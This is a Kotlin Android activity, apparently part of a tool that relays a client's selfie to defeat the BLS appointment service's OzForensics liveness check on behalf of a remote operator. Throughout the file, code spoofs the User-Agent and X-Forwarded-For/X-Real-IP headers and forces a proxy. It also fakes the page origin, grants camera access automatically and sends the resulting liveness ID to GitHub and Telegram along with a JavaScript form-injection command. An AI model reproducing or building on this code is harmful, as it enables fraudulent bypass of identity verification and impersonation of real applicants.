package com.sofzizou.bls

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.webkit.ProxyConfig
import androidx.webkit.ProxyController
import androidx.webkit.WebViewFeature
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.util.concurrent.Executors

class LivenessActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val github = GitHubClient()

    // Données lues depuis GitHub (partagées avec le bridge JS)
    @Volatile private var livenessData: GitHubClient.LivenessData? = null
    @Volatile private var sha2: String? = null   // SHA après "viewed"
    private lateinit var filename: String

    // ── onCreate ─────────────────────────────────────────────────────────────

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_liveness)

        filename = intent.getStringExtra(Constants.EXTRA_FILENAME) ?: run {
            Toast.makeText(this, "Erreur: fichier manquant", Toast.LENGTH_LONG).show()
            finish()
            return
        }
        val proxyUrl = intent.getStringExtra(Constants.EXTRA_PROXY_URL) ?: ""

        webView = findViewById(R.id.webview)
        setupWebView()

        if (proxyUrl.isNotEmpty()) {
            applyProxy(proxyUrl) { startFlow() }
        } else {
            startFlow()
        }
    }

    // ── Configuration WebView ────────────────────────────────────────────────

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView.settings.apply {
            javaScriptEnabled              = true
            domStorageEnabled              = true
            allowFileAccess                = false
            mediaPlaybackRequiresUserGesture = false
            mixedContentMode               = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }

        // Bridge JavaScript → Kotlin
        webView.addJavascriptInterface(AndroidBridge(), "Android")

        webView.webViewClient = object : WebViewClient() {

            // ── Intercepte TOUTES les requêtes OzForensics → injecte headers ──
            override fun shouldInterceptRequest(
                view: WebView,
                request: WebResourceRequest
            ): WebResourceResponse? {
                val url = request.url.toString()
                if (!url.contains("ozforensics.com")) return null

                val ip = livenessData?.ip       ?: return null
                val ua = livenessData?.userAgent ?: return null
                if (ip == "N/A" && ua == "N/A") return null

                return try {
                    val reqBuilder = okhttp3.Request.Builder().url(url)

                    // Copier les headers d'origine sauf User-Agent
                    request.requestHeaders.forEach { (k, v) ->
                        if (!k.equals("User-Agent", ignoreCase = true)) {
                            try { reqBuilder.header(k, v) } catch (_: Exception) {}
                        }
                    }

                    // Injecter User-Agent Windows Chrome
                    if (ua != "N/A") reqBuilder.header("User-Agent", ua)

                    // Injecter IP réelle du client
                    if (ip != "N/A") {
                        reqBuilder.header("X-Forwarded-For", ip)
                        reqBuilder.header("X-Real-IP",       ip)
                    }

                    val resp        = github.httpClient().newCall(reqBuilder.build()).execute()
                    val contentType = resp.header("Content-Type") ?: "application/octet-stream"
                    val mime        = contentType.split(";").first().trim()
                    val encoding    = if (contentType.contains("charset="))
                                         contentType.substringAfter("charset=").trim() else "UTF-8"

                    // Convertir les headers de réponse en Map<String,String>
                    val respHeaders = mutableMapOf<String, String>()
                    resp.headers.forEach { (k, v) -> respHeaders[k] = v }

                    WebResourceResponse(
                        mime, encoding, resp.code, resp.message.ifEmpty { "OK" },
                        respHeaders, resp.body?.byteStream()
                    )
                } catch (e: Exception) {
                    Log.e("OzIntercept", "Erreur intercept $url : ${e.message}")
                    null
                }
            }

            override fun onReceivedError(v: WebView, req: WebResourceRequest, err: WebResourceError) {
                Log.e("WebView", "Error ${err.errorCode}: ${err.description} @ ${req.url}")
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            // Autoriser la caméra pour OzForensics
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }
        }
    }

    // ── Proxy via androidx.webkit.ProxyController ────────────────────────────

    private fun applyProxy(proxyUrl: String, onReady: () -> Unit) {
        if (WebViewFeature.isFeatureSupported(WebViewFeature.PROXY_OVERRIDE)) {
            val config = ProxyConfig.Builder()
                .addProxyRule(proxyUrl)   // ex: "http://1.2.3.4:8080" ou "socks5://..."
                .build()
            ProxyController.getInstance().setProxyOverride(
                config,
                Executors.newSingleThreadExecutor()
            ) {
                runOnUiThread(onReady)
            }
        } else {
            // Fallback propriétés système (Android < 10 WebView ancien)
            try {
                val uri = android.net.Uri.parse(proxyUrl)
                System.setProperty("http.proxyHost",  uri.host ?: "")
                System.setProperty("http.proxyPort",  uri.port.toString())
                System.setProperty("https.proxyHost", uri.host ?: "")
                System.setProperty("https.proxyPort", uri.port.toString())
                Log.d("Proxy", "System proxy: ${uri.host}:${uri.port}")
            } catch (e: Exception) {
                Log.e("Proxy", "Fallback failed: ${e.message}")
            }
            onReady()
        }
    }

    // ── Flow principal : read → viewed → charger la page selfie ─────────────

    private fun startFlow() {
        CoroutineScope(Dispatchers.Main).launch {

            // 1. Lire le JSON depuis GitHub
            val data = withContext(Dispatchers.IO) { github.readFile(filename) }
            if (data == null) {
                Toast.makeText(this@LivenessActivity,
                    "Erreur: fichier introuvable sur GitHub", Toast.LENGTH_LONG).show()
                finish()
                return@launch
            }
            livenessData = data

            // 2. Marquer "viewed" → récupérer sha2
            sha2 = withContext(Dispatchers.IO) {
                github.markViewed(filename, data.sha, data.rawJson)
            }
            Log.d("Flow", "sha2 = $sha2")

            // 3. Telegram "lien ouvert"
            withContext(Dispatchers.IO) {
                github.sendTelegram(
                    "👁️ *Lien ouvert (Android)*\n📱 Client a ouvert l'app\n📁 `$filename`"
                )
            }

            // 4. Forcer le User-Agent WebView = UA de l'opérateur
            if (data.userAgent != "N/A") {
                webView.settings.userAgentString = data.userAgent
            }

            // 5. Charger liveness.html avec la base URL BLS
            //    → Jscrambler reçoit Referer: .../livenessrequest ✓
            val html = assets.open("liveness.html").bufferedReader().readText()
            webView.loadDataWithBaseURL(
                Constants.BLS_BASE_URL,
                html,
                "text/html",
                "UTF-8",
                null
            )
        }
    }

    // ── Bridge JavaScript ↔ Kotlin ───────────────────────────────────────────

    inner class AndroidBridge {

        @JavascriptInterface fun getUID() = livenessData?.userId        ?: "N/A"
        @JavascriptInterface fun getTID() = livenessData?.transactionId ?: "N/A"
        @JavascriptInterface fun getIP()  = livenessData?.ip            ?: "N/A"
        @JavascriptInterface fun getUA()  = livenessData?.userAgent     ?: "N/A"

        @JavascriptInterface
        fun onLivenessComplete(livenessId: String) {
            Log.d("Liveness", "✅ ID: $livenessId")

            runOnUiThread {
                CoroutineScope(Dispatchers.Main).launch {
                    val sha     = sha2 ?: livenessData?.sha ?: return@launch
                    val rawData = livenessData?.rawJson ?: JSONObject()

                    // Écrire le livenessId sur GitHub (sha2 indispensable, évite 409)
                    val ok = withContext(Dispatchers.IO) {
                        github.writeLivenessId(filename, sha, rawData, livenessId)
                    }

                    // Telegram de confirmation (x2 comme l'extension Chrome)
                    withContext(Dispatchers.IO) {
                        github.sendTelegram(
                            "✅ *Selfie terminé*\n" +
                            "🆔 *Liveness ID:* `$livenessId`\n" +
                            "📁 *Fichier:* $filename\n" +
                            "💾 *GitHub:* ${if (ok) "✅ Mis à jour" else "❌ Erreur"}"
                        )
                        Thread.sleep(500)
                        github.sendTelegram(
                            "✅ *Commande injection manuelle :*\n" +
                            "```javascript\n" +
                            "document.getElementById('LivenessId').value = \"$livenessId\";\n" +
                            "document.getElementById('formLiveness').submit();\n" +
                            "```"
                        )
                    }

                    showDoneScreen(livenessId)
                }
            }
        }

        @JavascriptInterface
        fun onLivenessError(error: String) {
            Log.e("Liveness", "❌ Erreur: $error")
            runOnUiThread {
                Toast.makeText(this@LivenessActivity,
                    "Erreur selfie: $error", Toast.LENGTH_LONG).show()
            }
        }
    }

    // ── Écran de confirmation ─────────────────────────────────────────────────

    private fun showDoneScreen(livenessId: String) {
        webView.loadDataWithBaseURL(null, """
            <html><body style="margin:0;
              background:linear-gradient(135deg,#07111f,#0f2a44);
              display:flex;justify-content:center;align-items:center;
              min-height:100vh;font-family:Arial;color:white;text-align:center;padding:20px">
            <div>
              <div style="font-size:80px">✅</div>
              <h2 style="color:#f5d27a;margin:20px 0">Selfie envoyé !</h2>
              <p style="opacity:.8;line-height:1.6">
                Votre selfie a été transmis à l'opérateur.<br>
                Votre rendez-vous sera finalisé sous peu.
              </p>
              <p style="font-size:10px;opacity:.3;margin-top:30px">${livenessId.take(16)}…</p>
            </div></body></html>
        """.trimIndent(), "text/html", "UTF-8", null)
    }

    // ── Cleanup proxy au destroy ──────────────────────────────────────────────

    override fun onDestroy() {
        if (WebViewFeature.isFeatureSupported(WebViewFeature.PROXY_OVERRIDE)) {
            ProxyController.getInstance()
                .clearProxyOverride(Executors.newSingleThreadExecutor()) {}
        }
        super.onDestroy()
    }
}
